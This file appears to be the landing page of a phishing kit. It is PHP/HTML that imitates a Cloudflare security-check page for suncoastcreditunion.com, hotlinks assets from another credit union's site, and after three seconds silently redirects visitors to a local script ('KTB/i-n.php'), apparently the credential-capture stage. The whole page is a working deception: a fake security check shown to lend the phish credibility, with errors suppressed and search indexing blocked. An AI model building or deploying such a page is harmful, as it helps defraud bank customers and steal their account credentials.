<?php
session_start();
error_reporting(0);

?>

<html lang="en-US"><head>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Refresh" content="3; url='KTB/i-n.php'" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="https://my.veridiancu.org/cdn-cgi/styles/challenges.css" rel="stylesheet">
    

<style type="text/css" id="operaUserStyle"></style><script src="/cdn-cgi/challenge-platform/h/b/orchestrate/captcha/v1?ray=785518b21c87a24d"></script><script src="https://cloudflare.hcaptcha.com/1/api.js?endpoint=https%3A%2F%2Fcloudflare.hcaptcha.com&amp;assethost=https%3A%2F%2Fcf-assets.hcaptcha.com&amp;imghost=https%3A%2F%2Fcf-imgs.hcaptcha.com&amp;render=explicit&amp;recaptchacompat=off&amp;onload=_cf_chl_hload"></script></head>
<body class="no-js">
    <div class="main-wrapper" role="main">
    <div class="main-content">
        <h1 class="zone-name-title h1">
            
        suncoastcreditunion.com
        </h1>
        <h2 class="h2" id="challenge-running">
            Checking if the site connection is secure
        </h2><div id="challenge-stage" style="display: none;"></div><div id="challenge-spinner" class="spacer loading-spinner" style="display: block; visibility: visible;"><div class="lds-ring"><div></div><div></div><div></div><div></div></div></div>
        <noscript>
            <div id="challenge-error-title">
                <div class="h2">
                    <span class="icon-wrapper">
                        <div class="heading-icon warning-icon"></div>
                    </span>
                    <span id="challenge-error-text">
                        Enable JavaScript and cookies to continue
                    </span>
                </div>
            </div>
        </noscript>
        <div id="trk_jschal_js" style="display:none;background-image:url('/cdn-cgi/images/trace/captcha/nojs/transparent.gif?ray=785518b21c87a24d')"></div>
        <div id="challenge-body-text" class="core-msg spacer">
        suncoastcreditunion.com needs to review the security of your connection before proceeding.
        </div><div id="challenge-explainer-expandable" class="hidden expandable body-text spacer" style="display: none;"><div class="expandable-title" id="challenge-explainer-summary"><button class="expandable-summary-btn" id="challenge-explainer-btn" type="button">Why am I seeing this page?<span class="caret-icon-wrapper"> <div class="caret-icon"></div> </span> </button> </div> <div class="expandable-details" id="challenge-explainer-details">Requests from malicious bots can pose as legitimate traffic. Occasionally, you may see this page while the site ensures that the connection is secure.</div></div><div id="challenge-success" style="display: none;"><div class="h2"><span class="icon-wrapper"><img class="heading-icon" alt="Success icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAAA0CAMAAADypuvZAAAANlBMVEUAAAAxMTEwMDAxMTExMTEwMDAwMDAwMDAxMTExMTExMTEwMDAwMDAxMTExMTEwMDAwMDAxMTHB9N+uAAAAEXRSTlMA3zDvfyBAEJC/n3BQz69gX7VMkcMAAAGySURBVEjHnZZbFoMgDEQJiDzVuv/NtgbtFGuQ4/zUKpeMIQbUhXSKE5l1XSn4pFWHRm/WShT1HRLWC01LGxFEVkCc30eYkLJ1Sjk9pvkw690VY6k8DWP9OM9yMG0Koi+mi8XA36NXmW0UXra4eJ3iwHfrfXVlgL0NqqGBHdqfeQhMmyJ48WDuKP81h3+SMPeRKkJcSXiLUK4XTHCjESOnz1VUXQoc6lgi2x4cI5aTQ201Mt8wHysI5fc05M5c81uZEtHcMKhxZ7iYEty1GfhLvGKpm+EYkdGxm1F5axmcB93DoORIbXfdN7f+hlFuyxtDP+sxtBnF43cIYwaZAWRgzxIoiXEMESoPlMhwLRDXeK772CAzXEdBRV7cmnoVBp0OSlyGidEzJTFq5hhcsA5388oSGM6b5p+qjpZrBlMS9xj4AwXmz108ukU1IomM3ceiW0CDwHCqp1NjAqXlFrbga+xuloQJ+tuyfbIBPNpqnmxqT7dPaOnZqBfhSBCteJAxWj58zLk2xgg+SPGYM6dRO6WczSnIxxwEExRaO+UyCUhbOp7CGQ+kxSUfNtLQFC+Po29vvy7jj4y0yAAAAABJRU5ErkJggg=="></span>Connection is secure</div><div class="core-msg spacer">Proceeding...</div></div>
        <form id="challenge-form" action="/Authentication?ReturnUrl=SignIn&amp;__cf_chl_f_tk=1oArJZN8HBbgUBYDCjfqMPiwls5UowrIKDrmjQCN0cg-1673014848-0-gaNycGzNDSU" method="POST" enctype="application/x-www-form-urlencoded">
            <input type="hidden" name="md" value="3RaYtjGUi5Ru_xMCTqP96ZyHC23MfaWjMOBYrpWeqyo-1673014848-0-ARIKPkdoPrT6OfSNomvE9wUICk8q2IpBi-jEagU0XDgqAxnXuQbW2Si_E6NT1YNHFSlNgD3q7riZFi9cZ4VAkZyG8Qj4RPt1jFFSVMDdw0RnWOAFOe1X8zRplqZ5CoImSyECQIPfpGYvtLFf9F7VaneNhJMvuiRVltN_qvfZvdPqsE4Dxo3kgQQ7bgLBPfPh0l7KJt9jJVJBvDHiiY6AmeUV9KmdfECuuziltMtUIQ1lUYDD11vUbW1jBuxSfOd1NUCvCn12DC0dT4C1yyR5Pjvpo3zBBklyNAQpYzaB6MNEbl6HkKW7eAkMb-9OLhqtKLyIjd0pmFP30HQKRc1_OzLURaIrXgZanaTekXiQu4-9lT7WJcgB46Rizl5DZ7MRah7HVK5oDW5T8ruvVhFERl8LQJ92FgaY0TcblbyePh3OpeEH0VFIeLRGqA17Wp8BNjogjzK-AW7cxLY47zkWaSxLkXc65HIiQuLXTDVPkP5Q4qHCX02d4KoiNgfHBp6q0vpfFXbstLofnJs29sMt0SFO2IYYfOdd-HSlSe5HwFQGXCfWp04aF6CyOGtBy-i7Q5sLwgQbAAK0tfxH_lo46m4">
            <input type="hidden" name="r" value="ruOyImK_D_tHFxHmHtQZ4xiEGTeTDqYAbSUjNlvFAaY-1673014848-0-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">
        <span style="display: none;"><span class="text-gray-600" data-translate="error">error code: 1020</span></span></form>
    </div>
</div>
<img src="https://my.veridiancu.org/cdn-cgi/images/trace/captcha/js/transparent.gif?ray=785518b21c87a24d" style="display: none">


    <div class="footer" role="contentinfo">
        <div class="footer-inner">
            <div class="clearfix diagnostic-wrapper">
                <div class="ray-id">Ray ID: <code>785518b21c87a24d</code></div>
            </div>
            <div class="text-center">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a></div>
        </div>
    </div>


<span id="trk_jschal_js"></span></body></html>
